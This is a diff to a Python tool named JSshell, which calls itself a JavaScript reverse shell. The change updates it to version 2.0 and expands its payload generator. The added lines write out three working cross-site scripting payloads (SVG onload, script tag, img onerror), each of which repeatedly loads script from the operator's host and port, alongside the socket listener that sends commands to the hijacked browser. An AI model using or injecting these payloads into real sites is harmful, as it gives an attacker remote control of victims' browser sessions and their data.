@@ -16,7 +16,7 @@ if sys.version_info < (3, 0):
 banner = '''%s    __              
   |(_  _ |_  _  |  |
 \_|__)_> | |(/_ |  |
-                      v1.0
+                      v2.0
 ''' % red
 hp = '''JSshell using javascript code as shell commands. Also supports some commands:
 help                  This help
@@ -25,7 +25,7 @@ pwd                   The source path
 exit, quit            Exit the JS shell'''
 
 
-parser = argparse.ArgumentParser(description='JSshell 1.0: javascript reverse shell')
+parser = argparse.ArgumentParser(description='JSshell 2.0: javascript reverse shell')
 parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
 parser.add_argument('-s', help='local sorce address', dest='host', default='')
 parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
@@ -49,12 +49,15 @@ except:
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
-payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>\n' % (blue, host, port)
+payload = '''
+ - SVG: %s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>
+%s - SCRIPT: %s<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)</script>
+%s - IMG: %s<img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>''' % (blue, host, port, white, blue, host, port, white, blue, host, port)
 
 
 print(banner)
 if gene == True:
-    print('%sPayload:  %s' % (white, payload))
+    print('%sPayloads:  %s' % (white, payload))
     
 print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
         
@@ -70,7 +73,7 @@ Connection: close
         s.bind(('0.0.0.0', port))
         if secs != 0:
             s.settimeout(secs)
-        buffer = input('%sjs-2.0%s$ %s' % (red, white, white))
+        buffer = input('%sjs-2.0%s$ ' % (red, white))
         s.listen(2)
         try:
             c, a = s.accept()
